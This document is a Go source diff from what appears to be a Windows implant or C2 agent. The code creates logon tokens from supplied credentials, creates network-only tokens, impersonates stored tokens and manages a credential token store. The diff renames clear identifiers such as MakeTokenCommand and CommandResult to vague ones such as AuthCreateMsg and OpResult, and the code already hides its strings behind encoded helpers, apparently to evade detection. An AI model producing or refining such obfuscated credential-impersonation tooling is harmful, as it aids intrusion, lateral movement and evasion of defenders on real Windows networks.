@@ -44,10 +44,10 @@ func mtTokenTypePrimary() string { return tokTpl(idxTokTypePrimary) }
 
 func mtUnknown() string { return tokTpl(idxTokUnknown) }
 
-// MakeTokenCommand handles Windows token creation with credentials (kept for delegation from TokenCommand)
-type MakeTokenCommand struct{}
+// AuthCreateMsg handles Windows token creation with credentials (kept for delegation from CredMsg)
+type AuthCreateMsg struct{}
 
-func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, password string, tokenName string, logonTypeStr string) CommandResult {
+func (c *AuthCreateMsg) createToken(ctx *OpCtx, userStr string, password string, tokenName string, logonTypeStr string) OpResult {
 	// Parse domain\user or just user
 	var domain, user string
 	if strings.Contains(userStr, mtBackslash()) {
@@ -87,28 +87,28 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 	// Convert strings to UTF16
 	userUTF16, err := syscall.UTF16PtrFromString(user)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E19),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	domainUTF16, err := syscall.UTF16PtrFromString(domain)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E19),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	passwordUTF16, err := syscall.UTF16PtrFromString(password)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E19),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -124,18 +124,18 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 	)
 
 	if ret == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E40),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Store token in unified store
 	if globalTokenStore == nil {
-		globalTokenStore = &UnifiedTokenStore{
+		globalTokenStore = &CredStore{
 			Tokens:   make(map[string]syscall.Handle),
-			Metadata: make(map[string]TokenMetadata),
+			Metadata: make(map[string]CredMeta),
 		}
 	}
 
@@ -148,7 +148,7 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 
 	// Store the token
 	globalTokenStore.Tokens[tokenName] = token
-	globalTokenStore.Metadata[tokenName] = TokenMetadata{
+	globalTokenStore.Metadata[tokenName] = CredMeta{
 		User:      user,
 		Domain:    domain,
 		Source:    mtSourceCreated(),
@@ -167,14 +167,14 @@ func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, pass
 
 	globalTokenStore.mu.Unlock()
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S1, tokenName),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr string, password string, tokenName string) CommandResult {
+func (c *AuthCreateMsg) createNetOnlyToken(ctx *OpCtx, userStr string, password string, tokenName string) OpResult {
 	// Parse domain\user
 	var domain, user string
 	if strings.Contains(userStr, mtBackslash()) {
@@ -190,28 +190,28 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 	// Convert strings to UTF16
 	userUTF16, err := syscall.UTF16PtrFromString(user)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E19),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	domainUTF16, err := syscall.UTF16PtrFromString(domain)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E19),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	passwordUTF16, err := syscall.UTF16PtrFromString(password)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E19),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -227,18 +227,18 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 	)
 
 	if ret == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E40),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Store token
 	if globalTokenStore == nil {
-		globalTokenStore = &UnifiedTokenStore{
+		globalTokenStore = &CredStore{
 			Tokens:   make(map[string]syscall.Handle),
-			Metadata: make(map[string]TokenMetadata),
+			Metadata: make(map[string]CredMeta),
 		}
 	}
 
@@ -249,7 +249,7 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 	}
 
 	globalTokenStore.Tokens[tokenName] = token
-	globalTokenStore.Metadata[tokenName] = TokenMetadata{
+	globalTokenStore.Metadata[tokenName] = CredMeta{
 		User:      user,
 		Domain:    domain,
 		Source:    mtSourceCreated(),
@@ -267,19 +267,19 @@ func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr strin
 
 	globalTokenStore.mu.Unlock()
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S1, tokenName),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
+func (c *AuthCreateMsg) impersonateToken(ctx *OpCtx) OpResult {
 	if globalTokenStore == nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E46),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -301,10 +301,10 @@ func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
 	globalTokenStore.mu.RUnlock()
 
 	if foundToken == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E47),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -322,10 +322,10 @@ func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
 		&impersonationToken,
 	)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E42),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 	defer CloseHandle(impersonationToken)
@@ -333,10 +333,10 @@ func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
 	// Impersonate the token
 	err = ImpersonateLoggedOnUser(impersonationToken)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E42),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -346,19 +346,19 @@ func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
 	globalTokenStore.ActiveToken = foundName
 	globalTokenStore.mu.Unlock()
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S4, foundName),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *MakeTokenCommand) clearTokens(ctx *CommandContext) CommandResult {
+func (c *AuthCreateMsg) clearTokens(ctx *OpCtx) OpResult {
 	if globalTokenStore == nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Succ(S0),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    0,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -393,22 +393,22 @@ func (c *MakeTokenCommand) clearTokens(ctx *CommandContext) CommandResult {
 	}
 
 	if clearedCount == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Succ(S0),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    0,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S2, strconv.Itoa(clearedCount)),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // Helper functions
-func (c *MakeTokenCommand) getCurrentUserInfo() (string, string) {
+func (c *AuthCreateMsg) getCurrentUserInfo() (string, string) {
 	token, err := syscall.OpenCurrentProcessToken()
 	if err == nil {
 		defer token.Close()
@@ -419,7 +419,7 @@ func (c *MakeTokenCommand) getCurrentUserInfo() (string, string) {
 	return mtUnknown(), mtUnknown()
 }
 
-func (c *MakeTokenCommand) getTokenUserInfo(token syscall.Handle) (string, string) {
+func (c *AuthCreateMsg) getTokenUserInfo(token syscall.Handle) (string, string) {
 	var needed uint32
 	procGetTokenInformation.Call(
 		uintptr(token),
@@ -470,7 +470,7 @@ func (c *MakeTokenCommand) getTokenUserInfo(token syscall.Handle) (string, strin
 	return syscall.UTF16ToString(nameBuffer), syscall.UTF16ToString(domainBuffer)
 }
 
-func (c *MakeTokenCommand) getLogonErrorMessage(errorCode syscall.Errno) string {
+func (c *AuthCreateMsg) getLogonErrorMessage(errorCode syscall.Errno) string {
 	// Return error code with Windows error hex for client-side translation
 	return ErrCtx(E40, fmt.Sprintf("0x%X", errorCode))
 }
